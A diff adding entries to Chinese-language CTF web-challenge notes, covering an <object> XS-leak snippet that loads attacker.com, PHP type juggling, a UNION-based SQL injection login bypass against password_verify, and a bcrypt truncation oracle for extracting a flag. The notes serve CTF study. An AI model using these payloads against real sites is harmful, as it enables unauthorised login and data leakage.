@@ -2728,3 +2728,21 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
 - `mongodb://`开头的url可在命令行用`mongodb mongodb://xxx`访问
 279. [idoriot](https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/imaginary_23/web/idoriot.md)
 - [IDOR](https://portswigger.net/web-security/access-control/idor)漏洞：指攻击者可控制程序用于设定权限的参数。比如`http://xxx.com/?user_id=1`中的user_id用于控制权限，但用户可随意设置，导致提权
+280. [Amogus](https://github.com/ixSly/CTFs/blob/master/ImaaginaryCTF/Amogus.md)
+- 利用`<object>`进行xs leak.这个技巧在 https://xsleaks.dev/docs/attacks/element-leaks/#when-javascript-cant-be-used 和 https://book.hacktricks.xyz/pentesting-web/xs-search#event-handler-techniques 均有提到
+```html
+<object data="//example.com">
+  <object data="//attacker.com"></object>
+</object>
+```
+若`example.com`返回错误（比如404），就会访问`attacker.com`
+- xs leak题目的特征也是有admin bot，且会提供搜索功能。可以拿题目的csp来[网站](https://csp-evaluator.withgoogle.com/)看一眼，缺什么csp就考虑什么样的攻击手段
+281. php类型混淆（type juggling）。`"anystring"==0`成立。更多参考 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
+282. [Login](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Web/login),[wp](https://f0rk3b0mb.github.io/p/imaginaryctf2023/#login)
+- 如果sql查询语句有注入漏洞，即使使用php的password_verify也无法阻止这点。参考 https://stackoverflow.com/questions/50756182/sql-injection-with-password-verify
+```php
+$res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);
+if (password_verify($password, $res['pwhash'])) //...
+```
+除了可以在sql语句处爆出数据库内容，还能绕过登录。`' UNION SELECT 'admin' AS username,'fake_hash' AS pwhash--`,利用union伪造一条查询结果。fake_hash为提前计算好的自行输入的任意password
+- 形如`$2y$10$C4lfi0f8kouggVBFkKF1ru./NEQTKqptjJCh6JI/hJieELWHLeFXi`是bcrypt hash。bcrypt限制hash内容的长度为72，意味着若hash的内容超过72后，只会取前72个字符进行hash，剩下的就丢掉了。若flag被拼接到可控制的输入后面且会返回hash的结果，可执行oracle攻击获取flag。原理：构造长度为71的任意pad字符串，尾部拼接flag后hash的内容就会携带flag的第一个字符。oracle返回pad+flag[0]的hash，就能拿着这个hash自行爆破，拿到第一个字符。然后pad长度减一，尾部拼接flag后hash的内容就会携带flag的前两个字符。拿到hash后自己拿pad+之前获取到的flag爆破即可。后面的flag以此类推
